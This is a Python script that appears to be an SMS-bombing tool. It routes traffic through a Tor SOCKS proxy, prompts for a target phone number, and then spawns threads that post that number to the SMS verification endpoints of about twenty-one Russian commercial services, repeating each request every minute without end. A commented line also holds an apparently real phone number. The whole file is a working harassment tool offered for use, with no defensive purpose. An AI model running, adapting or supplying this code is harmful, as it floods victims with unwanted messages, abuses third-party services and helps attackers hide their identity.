import requests
import services_all
import time
import socket, socks
from threading import Thread

delay = lambda x: time.sleep(x)

socks.set_default_proxy(socks.SOCKS5, "localhost", 9150)
socket.socket = socks.socksocket




def send(service):
    url = service[0]
    data = service[1]
    head = service[2]
    while True:
        req = requests.post(url, json=data, headers=head)
        if req.status_code in (200, 201):
            print("sms sent successfully.")
        else:
            print(f'Error:{str(req.status_code)} , url={url}' )
        delay(60)


def start(serveces):
    for service in enumerate(serveces):
        Thread(target=send, args=(serveces[service[0]],), daemon=True).start()
        delay(2)


if __name__ == '__main__':

    number = input('Enter number (example: 79123456789):')
    number = str(number)
    # number = '79535723263'
    spam = services_all.Service(number)
    services = (
        spam.ivi(),
        spam.iqos(),
        spam.invitro(),
        spam.indriver(),
        spam.icq(),
        spam.delimobil(),
        spam.qlean(),
        spam.ok(),
        spam.karusel(),
        spam.psbank(),
        spam.mtstv(),
        spam.sunlight(),
        spam.rutube(),
        spam.azbuka(),
        spam.y_eda(),
        spam.utair(),
        spam.p_food(),
        spam.tinder(),
        spam.y_chef(),
        spam.kfc(),
        spam.barbeq()
    )

    start(services)

    while True:
        continue
